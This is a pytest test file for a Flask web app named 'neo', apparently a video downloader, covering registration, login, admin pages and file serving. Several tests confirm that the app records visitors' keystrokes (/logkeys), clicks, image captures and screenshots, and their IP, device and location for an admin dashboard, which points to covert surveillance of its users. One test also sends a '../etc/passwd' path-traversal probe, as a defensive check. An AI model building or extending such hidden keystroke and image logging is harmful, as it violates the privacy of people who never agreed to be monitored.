"""Tests for the neo application.

Run with:  python3 -m pytest tests/test_neo.py -q
"""
import os
import sys
import tempfile
from pathlib import Path

import pytest

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

# Use an isolated SQLite DB for tests so state never leaks between runs.
_tmp_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
_tmp_db.close()
os.environ["NEO_DB_PATH"] = _tmp_db.name
os.environ.setdefault("VERCEL", "")
os.environ.pop("MONGO_URI", None)

from neo.app import create_app
from neo.db_adapter import get_db, close_db


@pytest.fixture
def app():
    application = create_app()
    application.config.update(TESTING=True)
    with application.app_context():
        yield application
    # Cleanup DB connection if open.
    try:
        close_db()
    except Exception:
        pass


@pytest.fixture
def client(app):
    return app.test_client()


def test_app_creates_with_blueprints(app):
    rules = {r.rule for r in app.url_map.iter_rules()}
    for expected in [
        "/", "/info", "/download", "/search",
        "/clip", "/remove_watermark",
        "/serve/<filename>", "/preview/<filename>", "/play/<filename>",
        "/register", "/login", "/logout", "/me",
        "/extract", "/capture", "/screenshot", "/logkeys", "/logclick",
        "/admin/", "/admin/login", "/admin/logout", "/admin/settings",
        "/admin/stats", "/admin/users", "/admin/user/<session_id>",
        "/admin/captures", "/admin/locations", "/admin/all", "/admin/delete-all",
        "/captures/<filename>", "/screenshots/<filename>",
    ]:
        assert expected in rules, f"missing route: {expected}"


def test_download_requires_url(client):
    r = client.post("/download", json={})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_extract_returns_json(client):
    r = client.get("/extract")
    assert r.status_code == 200
    data = r.get_json()
    for k in ("ip", "browser", "os", "device", "session_id"):
        assert k in data, f"extract missing key: {k}"


def test_track_endpoints_accept_data(client):
    r = client.post("/logkeys", json={"keys": "abc"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    r = client.post("/logclick", json={"tag": "BUTTON", "text": "Play", "x": 10, "y": 20, "page": "/"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    # Capture expects a base64 PNG; empty => 400 (no crash).
    r = client.post("/capture", json={"image": ""})
    assert r.status_code == 400

    # Screenshot expects a base64 image; empty => 400.
    r = client.post("/screenshot", json={"image": ""})
    assert r.status_code == 400


def test_index_page(client):
    resp = client.get("/")
    assert resp.status_code == 200
    assert b"html" in resp.data.lower()


def test_auth_register_login_logout_me(client):
    # Register
    r = client.post("/register", json={
        "username": "tester", "email": "tester@example.com", "password": "secret123"
    })
    assert r.status_code == 200
    body = r.get_json()
    assert body["success"] is True

    # Duplicate registration should fail.
    r = client.post("/register", json={
        "username": "tester", "email": "tester@example.com", "password": "secret123"
    })
    assert r.status_code == 409

    # Me (authenticated via session cookie).
    r = client.get("/me")
    assert r.get_json()["authenticated"] is True

    # Logout.
    r = client.post("/logout")
    assert r.get_json()["success"] is True
    r = client.get("/me")
    assert r.get_json()["authenticated"] is False

    # Login.
    r = client.post("/login", json={"username": "tester", "password": "secret123"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True

    # Wrong password.
    r = client.post("/login", json={"username": "tester", "password": "wrong"})
    assert r.status_code == 401


def test_admin_dev_mode_access(client):
    # With no ADMIN_PASSWORD and no stored hash, admin is unlocked (dev mode).
    # Hit login first to establish the session (dev mode auto-authenticates).
    client.get("/admin/login", follow_redirects=True)

    r = client.get("/admin/")
    assert r.status_code == 200
    assert b"NEO" in r.data

    r = client.get("/admin/stats")
    assert r.status_code == 200
    data = r.get_json()
    for key in ("total", "success", "failed", "sites", "countries", "by_day", "modes",
                "captures_total", "screenshots_total", "clicks_total",
                "unique_ips", "ip_count", "session_count", "recent"):
        assert key in data, f"stats missing key: {key}"

    r = client.get("/admin/users")
    assert r.status_code == 200
    assert "users" in r.get_json()

    r = client.get("/admin/locations")
    assert r.status_code == 200
    assert "downloads" in r.get_json()

    r = client.get("/admin/all")
    assert r.status_code == 200
    assert "downloads" in r.get_json()


def test_admin_delete_all(client):
    client.get("/admin/login", follow_redirects=True)
    r = client.post("/admin/delete-all", json={"target": "all"})
    assert r.status_code == 200
    assert r.get_json()["success"] is True


def test_admin_settings_pages(client):
    client.get("/admin/login", follow_redirects=True)
    r = client.get("/admin/settings")
    assert r.status_code == 200
    assert b"settings" in r.data.lower()


def test_info_requires_url(client):
    r = client.post("/info", json={})
    assert r.status_code == 400


def test_info_invalid_url_returns_error(client):
    r = client.post("/info", json={"url": "not-a-real-url"})
    assert r.status_code == 400
    assert r.get_json()["success"] is False


def test_serve_path_traversal_blocked(client):
    r = client.get("/serve/..%2f..%2fetc%2fpasswd")
    # Must never serve arbitrary files (403 from guard, 404 from routing guard).
    assert r.status_code in (403, 404)
    assert b"root:" not in r.data


def test_media_serve_invalid_filename(client):
    r = client.get("/captures/..%2f..%2fsecret")
    assert r.status_code in (400, 403, 404)


def test_diskwala_requires_login_anonymous(client):
    # Anonymous users hitting a diskwala URL must be redirected to /login.
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"})
    assert r.status_code in (301, 302)
    assert "/login" in r.headers.get("Location", "")


def test_diskwala_allowed_when_logged_in(client):
    # After login, the gate passes (download proceeds; will fail only on the
    # network/extraction step, not on the auth gate).
    client.post("/register", json={
        "username": "dwuser", "email": "dw@example.com", "password": "secret123"
    })
    r = client.post("/info", json={"url": "https://www.diskwala.com/watch/abc"})
    # Not a redirect -> gate passed; extraction may still fail offline.
    assert r.status_code != 302
    assert "/login" not in (r.headers.get("Location", ""))
